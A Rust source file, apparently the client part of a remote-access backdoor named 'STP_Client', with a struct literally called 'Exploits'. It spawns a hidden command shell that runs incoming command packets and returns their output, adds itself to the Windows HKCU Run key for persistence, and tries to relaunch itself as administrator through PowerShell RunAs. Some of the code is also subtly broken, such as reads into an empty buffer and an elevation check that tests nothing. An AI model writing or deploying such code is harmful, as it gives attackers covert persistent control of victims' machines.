use crate::structure::{Detector, StructStone};
use std::mem::size_of;
use std::ptr;
use std::{
    io::{Error, Read, Write},
    os::windows::process::CommandExt,
    process::{Child, ChildStderr, ChildStdin, ChildStdout, Command, Stdio},
    thread,
    time::Duration,
};
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::processthreadsapi::OpenProcessToken;
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::winnt::{
    TokenElevation, TokenElevationType, TokenElevationTypeDefault, TokenElevationTypeFull,
    TokenImpersonation,
};
use winreg::{
    enums::{HKEY_CURRENT_USER, KEY_WRITE},
    RegKey,
};

#[derive(Debug)]
pub struct Exploits {
    exploit_input: Vec<u8>,
    exploit_output: Vec<u8>,
    stdin_stream: Option<ChildStdin>,
    stdout_stream: Option<ChildStdout>,
    stderr_stream: Option<ChildStderr>,
}

impl Exploits {
    pub fn default() -> Exploits {
        let mut shell = Exploits::shell();
        Exploits {
            exploit_input: vec![],
            exploit_output: vec![],
            stdin_stream: shell.stdin,
            stdout_stream: shell.stdout,
            stderr_stream: shell.stderr,
        }
    }
    pub fn shell() -> Child {
        if cfg!(target_os = "windows") {
            Command::new("cmd")
                .creation_flags(0x08000000)
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .expect("Failed to start remote shell")
        } else {
            Command::new("sh")
                .creation_flags(0x08000000)
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .expect("Failed to start remote shell")
        }
    }

    fn read_buffer(&mut self, buffer_size: usize) -> Vec<u8> {
        let mut output: Vec<u8> = Vec::with_capacity(buffer_size);

        let stdout = match &mut self.stdout_stream {
            Some(stdout) => stdout,
            None => return output,
        };

        let stderr = match &mut self.stderr_stream {
            Some(stderr) => stderr,
            None => return output,
        };

        thread::sleep(Duration::from_micros(500));

        loop {
            match stdout.read(&mut output) {
                Ok(bytes_read) if bytes_read != buffer_size => break,
                Ok(_) => {} // Continue loopContinue loop
                Err(e) => panic!("Failed to read from stdout: {}", e),
            }
            thread::sleep(Duration::from_micros(500))
        }

        // if output.is_empty() {
        //     // loop {
        //     //     match stderr.read(&mut output) {
        //     //         Ok(bytes_read) if bytes_read != buffer_size => break,
        //     //         Ok(ok) => {
        //     //             println!("{:?}", ok)
        //     //         } // Continue loopContinue loop
        //     //         Err(e) => panic!("Failed to read from stderr: {}", e),
        //     //     }
        //     //     thread::sleep(Duration::from_micros(500))
        //     // }
        // }

        output
    }
}

pub trait HandleExploits {
    fn execute(&mut self);
    fn get_output(&mut self) -> Vec<u8>;
    fn command(&mut self, packet: Vec<u8>) -> Vec<u8>;
}

impl HandleExploits for Exploits {
    fn execute(&mut self) {
        if let Some(mut input_stream) = self.stdin_stream.as_mut() {
            input_stream
                .write(&self.exploit_input)
                .expect("Failed to write to stdin");
            input_stream.flush().expect("Failed to write to stdin");
        }

        let mut output: Vec<u8> = self.read_buffer(2048);

        self.exploit_output = output.to_vec();
    }

    fn get_output(&mut self) -> Vec<u8> {
        self.exploit_output.clone()
    }

    fn command(&mut self, command: Vec<u8>) -> Vec<u8> {
        self.exploit_input = command;
        self.exploit_input.extend(b"\n");
        self.execute();
        self.get_output()
    }
}

pub fn setup_registry() -> Result<(), Error> {
    // 레지스트리 키 열기 (읽기 전용)
    let hklm = RegKey::predef(HKEY_CURRENT_USER);
    let subkey = "Software/Microsoft/Windows/CurrentVersion/Run";
    let key = hklm.create_subkey_with_flags(subkey, KEY_WRITE)?;
    let binding = std::env::current_exe().unwrap();
    let start_path = &binding.to_string_lossy();
    key.0.set_value("STP_Client", &start_path.to_string())
}

pub fn is_elevated() -> bool {
    // println!("{:?}", std::env::var_os("ELEVATE_CMD").is_none());
    // if !std::env::var_os("ELEVATE_CMD").is_none() {
    //     return true;
    // }

    let output = Command::new("cmd")
        .args(&["/C", "echo", "1"])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()
        .expect("Failed to run cmd.exe");

    output.status.success()
}

pub fn try_run_as_admin() -> Result<(), String> {
    let mut cmd = Command::new("cmd");
    cmd.arg("/C");
    cmd.arg("start");
    cmd.arg("/min");
    cmd.arg("powershell");
    cmd.arg("-Command");
    cmd.arg("Start-Process");
    cmd.arg("-Verb");
    cmd.arg("RunAs");
    cmd.arg(&*std::env::current_exe().unwrap().to_string_lossy());

    let status = cmd
        .status()
        .map_err(|e| format!("Failed to run as admin: {}", e))?;

    if status.success() {
        // std::process::exit(0)
        Ok(())
    } else {
        Err("Failed to obtain admin privileges".to_string())
    }
}
